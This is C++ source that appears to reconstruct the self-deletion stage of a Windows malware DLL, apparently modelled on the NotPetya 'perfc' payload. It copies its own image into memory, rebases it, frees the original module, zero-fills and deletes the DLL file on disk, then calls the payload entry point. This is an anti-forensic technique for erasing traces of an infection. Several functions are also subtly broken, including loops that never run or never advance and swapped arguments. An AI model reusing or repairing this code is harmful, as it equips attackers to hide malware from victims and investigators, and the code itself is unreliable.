#include "ZPE.h"


int __cdecl perfc_1(int arg0, DWORD dwErrCode, WCHAR* pCommandLine, HANDLE hThread);

BOOL ReadSelfData()
{
	BOOL bRet = FALSE;
	HANDLE hFile = CreateFileW(g_pszFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		if (dwFileSize > 0)
		{
			BYTE *pData = new BYTE[dwFileSize];
			if (pData != NULL)
			{
				DWORD dwNumberOfBytesRead = 0;
				if (ReadFile(hFile, pData, dwFileSize, &dwNumberOfBytesRead, 0) || dwNumberOfBytesRead != dwFileSize)
				{
					g_bSelfFileData = pData;
					g_dwSelfFileBufSize = dwFileSize;
					bRet = TRUE;
				}
				else
				{
					delete[]pData;
				}
			}
		}
		CloseHandle(hFile);
	}
	return bRet;
}

DWORD V2F(PIMAGE_NT_HEADERS pNtHeader, DWORD dwAddr)
{
	DWORD dwResult = 0;
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((DWORD)&pNtHeader->OptionalHeader + pNtHeader->FileHeader.SizeOfOptionalHeader);
	DWORD dwNumSec = pNtHeader->FileHeader.NumberOfSections;

	for (int i = 0; i < dwNumSec; i++)
	{
		DWORD VirualSecAddr = (DWORD)(pSecHeader->VirtualAddress);
		if (VirualSecAddr <= dwAddr && VirualSecAddr + pSecHeader->SizeOfRawData >= dwAddr)
		{
			dwResult = dwAddr + pSecHeader->PointerToRawData - VirualSecAddr;
			break;
		}
		++pSecHeader;
	}
	return dwResult;
}

BOOL RepairBaseRelocation(LPVOID pBase, PIMAGE_BASE_RELOCATION pRelocAddr)
{
	BOOL bRet = TRUE;
	DWORD dwDef = (DWORD)pBase - (DWORD)g_hModule;

	while (pRelocAddr->VirtualAddress && !bRet)
	{
		DWORD dwRVAReloc = pRelocAddr->VirtualAddress;
		PWORD pwVAReloc = (PWORD)(dwRVAReloc + (DWORD)pBase + sizeof(IMAGE_BASE_RELOCATION));
		DWORD dwCount = (pRelocAddr->SizeOfBlock - 8) / 2;
		DWORD dwBase = (DWORD)dwRVAReloc + (DWORD)pBase;
		for (int i = 0; i < dwCount; i++)
		{
			DWORD RelocData = pwVAReloc[i];
			if ((NULL != RelocData) && ((RelocData & 0xF000) == 0x3000))
			{
				*(DWORD *)((RelocData & 0xFFF) + dwBase) += dwDef;
			}
			else
			{
				bRet = FALSE;
			}
		}

		pRelocAddr = (PIMAGE_BASE_RELOCATION)((DWORD)pRelocAddr + pRelocAddr->SizeOfBlock);
	}
	return bRet;
}

BOOL InitImportTable()
{
	BOOL bRet = FALSE;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)g_hModule;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader->e_lfanew + (DWORD)g_hModule);
	PIMAGE_IMPORT_DESCRIPTOR pImageImportDir = (PIMAGE_IMPORT_DESCRIPTOR)(pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD)g_hModule);

	if (NULL != pImageImportDir)
	{
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)(pNtHeader->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER)+(DWORD)g_hModule);
		DWORD dwSectionCount = pNtHeader->FileHeader.NumberOfSections;

		DWORD dwIATAddr = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		for (int i = 0; i < dwSectionCount; i++)
		{
			if (dwIATAddr >= pSectionHeader->VirtualAddress
				&& dwIATAddr < (pSectionHeader->Misc.VirtualSize + pSectionHeader->VirtualAddress))
			{
				break;
			}
			pSectionHeader = pSectionHeader + 1;
		}

		DWORD dwOldProtect = 0;
		if (VirtualProtect((LPVOID)(pSectionHeader->VirtualAddress + g_hModule), pSectionHeader->Misc.VirtualSize, PAGE_READWRITE, &dwOldProtect))
		{
			bRet = TRUE;
			if (0 != pImageImportDir->OriginalFirstThunk)
			{
				while (bRet)
				{
					HMODULE hLib = LoadLibraryA((char*)(pImageImportDir->Name + (DWORD)g_hModule));
					if (NULL != hLib)
					{
						PDWORD pImport = (PDWORD)(pImageImportDir->FirstThunk + (DWORD)g_hModule);
						PDWORD pCha = (PDWORD)(pImageImportDir->OriginalFirstThunk + (DWORD)g_hModule);
						for (int i = 0; pCha[i] && bRet; i++)
						{
							LPCSTR pName = NULL;
							if (pCha[i] & 0x80000000)
							{
								pName = (LPCSTR)(pCha[i] & 0x7fffffff);
							}
							else
							{
								pName = (LPCSTR)g_hModule + pCha[i] + 2;
							}

							pImport[i] = (DWORD)GetProcAddress(hLib, pName);
							if (0 == pImport[0])
							{
								bRet = FALSE;
							}
						}
					}
					else
					{
						bRet = FALSE;
					}

					if (0 == pImageImportDir->OriginalFirstThunk)
					{
						break;
					}
				}

				if (bRet)
				{
					bRet = VirtualProtect((LPBYTE)pSectionHeader->VirtualAddress + (DWORD)g_hModule, pSectionHeader->Misc.VirtualSize, dwOldProtect, &dwOldProtect);
				}
			}
		}
	}

	return bRet;
}

BOOL DeleteSelfRun(int nArg, DWORD dwErrCode, WCHAR* pCommandLine, HANDLE hThread)
{
	BOOL bRet = g_nFreeSelfMark = FreeLibrary(g_hModule);
	if (bRet)
	{
		g_hModule = (HMODULE)g_pSelfMemData;
		HANDLE hFile = CreateFileW(g_pszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (NULL != hFile)
		{
			DWORD dwFileSize = GetFileSize(hFile, NULL);
			CloseHandle(hFile);

			hFile = CreateFileW(g_pszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
			if (NULL != hFile)
			{
				PBYTE lpNewData = new BYTE[dwFileSize];
				memset(lpNewData, 0, dwFileSize);
				WriteFile(hFile, lpNewData, dwFileSize, &dwFileSize, NULL);
				delete[]lpNewData;
				CloseHandle(hFile);
			}
		}
		DeleteFileW(g_pszFileName);

		if (InitImportTable())
		{
			perfc_1(nArg, dwErrCode, pCommandLine, hThread);
		}
		ExitProcess(0);
	}
	return bRet;
}

BOOL RestorePageAttr(LPVOID hModule, PIMAGE_NT_HEADERS pNtHeader)
{
	DWORD dwflOldProtect = 0;
	BOOL bRet = FALSE;
	if (VirtualProtect(hModule, pNtHeader->OptionalHeader.SizeOfImage, PAGE_READONLY, &dwflOldProtect))
	{
		bRet = TRUE;
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)(pNtHeader->FileHeader.SizeOfOptionalHeader + (DWORD)(&pNtHeader->OptionalHeader) + (DWORD)hModule);
		for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)
		{
			DWORD dwNewAtt = 0;
			if (pSectionHeader->Characteristics & GENERIC_EXECUTE)
			{
				dwNewAtt = pSectionHeader->Characteristics & 0x80000000 ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
			}
			else if (pSectionHeader->Characteristics < 0)
			{
				dwNewAtt = PAGE_READWRITE;
			}

			if (!VirtualProtect((LPVOID)((DWORD)hModule + pSectionHeader->SizeOfRawData), pSectionHeader->VirtualAddress, dwNewAtt, &dwflOldProtect))
			{
				bRet = FALSE;
				break;
			}

			pSectionHeader = pSectionHeader + 1;
		}
	}
	return bRet;
}

LPVOID AllocAndCopySelfData(HMODULE hModule)
{
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader->e_lfanew + (DWORD)hModule);
	SIZE_T dwSize = pNtHeader->OptionalHeader.SizeOfImage;
	LPVOID pData = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (NULL != pData)
	{
		g_pSelfMemData = (PIMAGE_DOS_HEADER)pData;
		/*把自身内存拷贝到新内存中*/
		memcpy(pData, hModule, dwSize);
	}

	return pData;
}

PIMAGE_BASE_RELOCATION GetRelocation(HMODULE hModule)
{
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModule + pDosHeader->e_lfanew);
	PIMAGE_BASE_RELOCATION pReloc = NULL;
	if (NULL != pNtHeader)
	{
		DWORD dwBaseRelocVa = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		DWORD dwBaseRelocSize = pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		if (0 != dwBaseRelocVa && 0 != dwBaseRelocSize)
		{
			pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)g_pSelfMemData + V2F(pNtHeader, dwBaseRelocVa));
		}
	}

	return pReloc;
}

void DeleteSelfReEntry(int nArg, DWORD dwErrCode, WCHAR* pCommandLine)
{
	SIZE_T dwSize = 0;
	try
	{
		if (g_nFreeSelfMark && (NULL != g_bSelfFileData))
		{
			throw 0;
		}

		g_pSelfMemData = (PIMAGE_DOS_HEADER)AllocAndCopySelfData(g_hModule);
		if (NULL == g_pSelfMemData)
		{
			throw 0;
		}

		PIMAGE_BASE_RELOCATION pRelocBase = GetRelocation((HMODULE)g_pSelfMemData);
		if (NULL == pRelocBase)
		{
			throw 0;
		}

		PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)g_pSelfMemData + ((PIMAGE_DOS_HEADER)g_pSelfMemData)->e_lfanew);
		if (NULL == pNtHeader)
		{
			throw 0;
		}

		/*修复重定位表*/
		if (!RepairBaseRelocation(g_pSelfMemData, pRelocBase))
		{
			throw 0;
		}

		/*还原内存属性*/
		if (!RestorePageAttr(g_pSelfMemData, pNtHeader))
		{
			throw 0;
		}

		/*自删除dll文件，并调用入口函数*/
		typedef BOOL(*PFNDeleteSelfRun)(int nArg, DWORD dwErrCode, WCHAR* pCommandLine, HANDLE hThread);
		PFNDeleteSelfRun pDeleteSelfRun = (PFNDeleteSelfRun)((DWORD)DeleteSelfRun - (DWORD)g_hModule + (DWORD)g_pSelfMemData);
		pDeleteSelfRun(nArg, dwErrCode, pCommandLine, INVALID_HANDLE_VALUE);
	}
	catch (...)
	{
	}

	if (NULL != g_pSelfMemData)
	{
		DWORD flOldProtect;
		if (VirtualProtect(g_pSelfMemData, dwSize, PAGE_READWRITE, &flOldProtect))
		{
			memset(g_pSelfMemData, 0, dwSize);
			VirtualFree(g_pSelfMemData, dwSize, MEM_DECOMMIT);
		}
	}
}